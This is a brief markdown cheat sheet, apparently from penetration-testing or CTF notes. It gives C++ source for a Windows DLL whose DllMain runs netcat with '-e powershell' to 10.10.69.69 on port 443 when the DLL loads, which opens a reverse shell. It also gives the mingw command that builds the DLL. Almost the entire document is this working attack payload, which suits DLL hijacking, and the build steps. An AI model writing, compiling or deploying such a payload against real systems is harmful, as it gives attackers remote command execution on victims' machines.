# compile windows DLL to run commands

## DLL code
```cpp
#include <windows.h>

BOOL WINAPI DllMain(
  HINSTANCE hinstDLL,  // handle to DLL module
  DWORD fdwReason,     // reason for calling function
  LPVOID lpReserved )  // reserved
{
  switch( fdwReason ) // Perform actions based on the reason for calling.
  {
    case DLL_PROCESS_ATTACH: // Initialize once for each new process.  Return FALSE to fail DLL load.
      WinExec("c:\\windows\\tasks\\nc.exe 10.10.69.69 443 -e powershell", 0);
      //system("c:\\windows\\tasks\\nc.exe 10.10.69.69 443 -e powershell");
      break;

    case DLL_THREAD_ATTACH: // Do thread-specific initialization.
    case DLL_THREAD_DETACH: // Do thread-specific cleanup.
    case DLL_PROCESS_DETACH: // Perform any necessary cleanup.
      break;
  }
  return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
```

### building with mingw
builds x64. install i686 mingw packages to build x86.
```bash
x86_64-w64-mingw32-g++ -shared dll.cpp -o dll.dll
file dll.dll
dll.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows
```
